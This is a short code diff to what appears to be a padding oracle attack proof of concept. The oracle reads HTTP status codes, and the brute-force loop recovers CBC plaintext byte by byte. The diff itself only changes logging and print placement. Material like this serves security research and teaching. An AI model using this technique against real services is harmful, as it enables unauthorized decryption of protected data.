@@ -37,7 +37,7 @@ def my_oracle(text):
         if response.status_code == 500:
             return False
         elif response.status_code == 401 or response.status_code == 200:
-            print("Success, current text: ", text)
+            log.info("Success, current text: " + text)
             return True
         else: # Shouldn't happen
             print("WTF")
@@ -84,7 +84,9 @@ def poc(encrypted):
                         bruteforce_block[-k] = padding+1 ^ current_decrypted_block[-k] ^ previous_encrypted_block[-k]
 
                     break
-        print("Current request count: ", request_count)
+                
+                print("Current request count: ", request_count)
+ 
 
         decrypted = bytes(current_decrypted_block) + bytes(decrypted)
 
